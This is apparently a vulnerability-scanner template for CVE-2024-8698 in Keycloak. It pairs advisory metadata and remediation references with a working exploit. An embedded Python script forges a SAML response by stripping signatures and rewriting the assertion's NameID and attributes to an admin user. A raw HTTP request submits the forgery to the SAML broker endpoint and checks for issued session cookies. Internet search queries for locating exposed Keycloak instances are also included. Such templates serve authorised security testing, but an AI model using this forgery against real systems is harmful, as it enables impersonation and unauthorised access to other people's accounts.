code:
- engine:
  - py
  - python3
  source: "import os\nimport base64\nimport urllib.parse\nfrom lxml import etree\n\
    \n# Get environment variables\nusername = b'admin@example.com'\nsaml_response\
    \ = os.getenv('SAMLResponse')\nusername = os.getenv('username')\nif not username:\n\
    \    username='admin'\n# Decode and parse the SAML response\nxml_content = base64.b64decode(urllib.parse.unquote(saml_response))\n\
    parser = etree.XMLParser(remove_blank_text=True)\nroot = etree.fromstring(xml_content,\
    \ parser)\n\n# Define namespaces\nnamespaces = {\n    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',\n\
    \    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',\n    'ds': 'http://www.w3.org/2000/09/xmldsig#'\n\
    }\n\n# Find the <ds:Signature> element inside the root\nresponse_signature = root.find('.//ds:Signature',\
    \ namespaces)\nif response_signature is not None:\n    root.remove(response_signature)\
    \  # Remove the <ds:Signature> element from the root\n\n# Find the <saml:Assertion>\
    \ element (this is the old assertion)\nold_ass = root.find('.//saml:Assertion',\
    \ namespaces)\nass_signode = old_ass.find('./ds:Signature',namespaces)\nif ass_signode\
    \ is not None:\n    old_ass.remove(ass_signode)\nissuer = root.find('.//saml:Issuer',\
    \ namespaces)\nissuer.addnext(ass_signode)\nmod_ass = etree.fromstring(etree.tostring(old_ass))\n\
    mod_ass.find('.//saml:NameID',namespaces).text = username\nfor s in mod_ass.findall('.//saml:AttributeValue',namespaces):\n\
    \        s.text = username\nmod_ass.attrib['ID'] = mod_ass.attrib['ID'][:-1]\n\
    resp_issuer = root.find('.//samlp:Status', namespaces)\nresp_issuer.addnext(mod_ass)\n\
    \n\nmodified_saml_response = etree.tostring(root, pretty_print=False, encoding='UTF-8',\
    \ xml_declaration=False).decode('utf-8')\nprint(modified_saml_response)\n"
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains_all(header,"KEYCLOAK_IDENTITY","KEYCLOAK_SESSION")
    type: dsl
  raw:
  - 'POST /realms/master/broker/saml/endpoint HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: AUTH_SESSION_ID_LEGACY={{AUTH_SESSION_ID_LEGACY}}


    RelayState={{RELAYSTATE}}&SAMLResponse={{urlencode(base64(code_response))}}

    '
id: CVE-2024-8698
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-8698
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 7.7
    cwe-id: CWE-347
    epss-percentile: 0.99015
    epss-score: 0.79123
  description: 'A flaw exists in the SAML signature validation method within the Keycloak
    XMLSignatureUtil class. The method incorrectly determines whether a SAML signature
    is for the full document or only for specific assertions based on the position
    of the signature in the XML document, rather than the Reference element used to
    specify the signed element. This flaw allows attackers to create crafted responses
    that can bypass the validation, potentially leading to privilege escalation or
    impersonation attacks.

    '
  impact: 'Attackers can create crafted SAML responses that bypass signature validation,
    potentially leading to privilege escalation, impersonation attacks, and unauthorized
    access to protected resources in Keycloak.

    '
  metadata:
    fofa-query: icon_hash=-1105083093
    google-query: intitle:"keycloak"
    max-request: 1
    product: keycloak
    shodan-query: http.favicon.hash:"-1105083093"
    vendor: redhat
    verified: true
  name: Keycloak - SAML Core Package Signature Validation Flaw
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-8698
  - https://access.redhat.com/errata/RHSA-2024:6878
  - https://access.redhat.com/errata/RHSA-2024:6879
  - https://access.redhat.com/errata/RHSA-2024:6880
  - https://access.redhat.com/errata/RHSA-2024:6882
  remediation: 'Apply Red Hat security updates (RHSA-2024:6878, RHSA-2024:6879, RHSA-2024:6880,
    RHSA-2024:6882) to address the SAML signature validation flaw in Keycloak XMLSignatureUtil
    class.

    '
  severity: high
  tags: cve,cve2024,keycloak,saml,signature,vuln
variables:
  AUTH_SESSION_ID_LEGACY: '{{auth_cookie}}'
  RELAYSTATE: '{{relayState}}'
